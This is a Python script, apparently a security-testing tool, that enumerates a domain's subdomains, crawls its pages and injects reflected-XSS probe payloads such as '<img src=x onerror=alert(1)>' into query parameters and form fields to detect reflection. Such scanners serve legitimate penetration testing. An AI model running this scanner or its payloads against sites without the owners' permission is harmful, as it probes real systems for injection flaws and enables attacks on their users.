#!/usr/bin/env python3
"""Simple authorized XSS assessment helper."""

from __future__ import annotations

import argparse
import json
import socket
import time
from dataclasses import dataclass
from html.parser import HTMLParser
from typing import Iterable
from urllib.error import HTTPError, URLError
from urllib.parse import parse_qs, urlencode, urljoin, urlparse, urlunparse
from urllib.request import Request, urlopen

USER_AGENT = "XSS-Scanner/0.1 (authorized security testing only)"
DEFAULT_PAYLOADS = [
    '<script>alert(1)</script>',
    '" onmouseover="alert(1)" x="',
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
]
COMMON_SUBDOMAIN_PREFIXES = ["www", "app", "api", "dev", "test", "staging", "admin", "portal", "beta", "m"]


@dataclass
class HttpResponse:
    url: str
    status: int
    content_type: str
    text: str


@dataclass
class Vulnerability:
    url: str
    vector: str
    payload: str
    evidence: str


class PageParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__()
        self.links: list[str] = []
        self.forms: list[dict] = []
        self._active_form: dict | None = None

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        attr_map = {k: (v or "") for k, v in attrs}
        if tag == "a" and "href" in attr_map:
            self.links.append(attr_map["href"])
        elif tag == "form":
            self._active_form = {
                "action": attr_map.get("action", ""),
                "method": attr_map.get("method", "get").lower(),
                "inputs": [],
            }
            self.forms.append(self._active_form)
        elif tag in {"input", "textarea", "select"} and self._active_form is not None:
            name = attr_map.get("name")
            if name:
                self._active_form["inputs"].append(name)

    def handle_endtag(self, tag: str) -> None:
        if tag == "form":
            self._active_form = None


def normalize_domain(domain: str) -> str:
    domain = domain.strip().lower()
    if domain.startswith(("http://", "https://")):
        domain = urlparse(domain).netloc
    return domain.split(":")[0]


def http_request(url: str, timeout: float, method: str = "GET", data: bytes | None = None) -> HttpResponse | None:
    req = Request(url=url, method=method, data=data, headers={"User-Agent": USER_AGENT})
    try:
        with urlopen(req, timeout=timeout) as resp:
            raw = resp.read()
            text = raw.decode("utf-8", errors="replace")
            return HttpResponse(
                url=resp.geturl(),
                status=getattr(resp, "status", 200),
                content_type=resp.headers.get("Content-Type", ""),
                text=text,
            )
    except (HTTPError, URLError, TimeoutError):
        return None


def discover_subdomains(domain: str, timeout: float) -> set[str]:
    discovered = set()
    crt = http_request(f"https://crt.sh/?q=%25.{domain}&output=json", timeout)
    if crt and crt.text:
        try:
            entries = json.loads(crt.text)
            for item in entries:
                for name in str(item.get("name_value", "")).splitlines():
                    clean = name.replace("*.", "").strip().lower()
                    if clean.endswith(f".{domain}") or clean == domain:
                        discovered.add(clean)
        except json.JSONDecodeError:
            pass

    for prefix in COMMON_SUBDOMAIN_PREFIXES:
        discovered.add(f"{prefix}.{domain}")
    discovered.add(domain)

    resolved = set()
    for host in discovered:
        try:
            socket.gethostbyname(host)
            resolved.add(host)
        except socket.gaierror:
            continue
    return resolved


def candidate_base_urls(host: str) -> list[str]:
    return [f"https://{host}", f"http://{host}"]


def fetch_html(url: str, timeout: float) -> HttpResponse | None:
    response = http_request(url, timeout)
    if response and "text/html" in response.content_type.lower():
        return response
    return None


def collect_links(seed_url: str, html: str, domain: str, max_links: int) -> set[str]:
    parser = PageParser()
    parser.feed(html)
    links: set[str] = set()
    for href in parser.links:
        absolute = urljoin(seed_url, href)
        parsed = urlparse(absolute)
        if not parsed.scheme.startswith("http"):
            continue
        if not parsed.netloc.endswith(domain):
            continue
        cleaned = urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", parsed.query, ""))
        links.add(cleaned)
        if len(links) >= max_links:
            break
    return links


def extract_form_details(html: str) -> list[dict]:
    parser = PageParser()
    parser.feed(html)
    return parser.forms


def test_query_reflection(url: str, payloads: Iterable[str], timeout: float) -> list[Vulnerability]:
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    findings: list[Vulnerability] = []
    if not params:
        return findings

    for param in params:
        for payload in payloads:
            test_params = {k: v[-1] for k, v in params.items()}
            test_params[param] = payload
            test_query = urlencode(test_params)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", test_query, ""))
            resp = http_request(test_url, timeout)
            if resp and payload in resp.text:
                findings.append(
                    Vulnerability(test_url, f"query parameter: {param}", payload, "Payload reflected in response body.")
                )
    return findings


def test_form_reflection(form: dict, current_url: str, payloads: Iterable[str], timeout: float) -> list[Vulnerability]:
    if not form.get("inputs"):
        return []

    action_url = urljoin(current_url, form.get("action", ""))
    method = form.get("method", "get").lower()
    findings: list[Vulnerability] = []

    for payload in payloads:
        fields = {name: payload for name in form["inputs"]}
        encoded = urlencode(fields).encode()
        if method == "post":
            resp = http_request(action_url, timeout, method="POST", data=encoded)
        else:
            sep = "&" if urlparse(action_url).query else "?"
            resp = http_request(f"{action_url}{sep}{urlencode(fields)}", timeout)
        if resp and payload in resp.text:
            findings.append(
                Vulnerability(
                    action_url,
                    f"form ({method.upper()}) inputs: {', '.join(form['inputs'])}",
                    payload,
                    "Payload reflected in form response.",
                )
            )
    return findings


def scan(domain: str, timeout: float, max_links: int, delay: float) -> list[Vulnerability]:
    findings: list[Vulnerability] = []
    subdomains = discover_subdomains(domain, timeout)

    print(f"[+] Resolved subdomains: {len(subdomains)}")
    for sub in sorted(subdomains):
        print(f"    - {sub}")

    for host in sorted(subdomains):
        base: HttpResponse | None = None
        for candidate in candidate_base_urls(host):
            base = fetch_html(candidate, timeout)
            if base:
                break
        if not base:
            continue

        print(f"[+] Crawling {base.url}")
        urls = {base.url}
        urls.update(collect_links(base.url, base.text, domain, max_links))

        for url in sorted(urls):
            time.sleep(delay)
            page = fetch_html(url, timeout)
            if not page:
                continue
            print(f"    [*] Testing: {url}")
            findings.extend(test_query_reflection(url, DEFAULT_PAYLOADS, timeout))
            for form in extract_form_details(page.text):
                findings.extend(test_form_reflection(form, url, DEFAULT_PAYLOADS, timeout))

    return findings


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="Discover subdomains and test likely XSS injection points.")
    p.add_argument("target", help="Target domain like example.com")
    p.add_argument("--timeout", type=float, default=8.0)
    p.add_argument("--max-links", type=int, default=30)
    p.add_argument("--delay", type=float, default=0.1)
    return p


def main() -> None:
    args = build_parser().parse_args()
    print("[!] Use only with explicit written authorization.")
    domain = normalize_domain(args.target)
    findings = scan(domain, args.timeout, args.max_links, args.delay)

    print("\n=== Findings ===")
    if not findings:
        print("No reflected XSS patterns found with current payload list.")
        return

    for i, f in enumerate(findings, 1):
        print(f"{i}. URL: {f.url}")
        print(f"   Vector: {f.vector}")
        print(f"   Payload: {f.payload}")
        print(f"   Evidence: {f.evidence}")


if __name__ == "__main__":
    main()
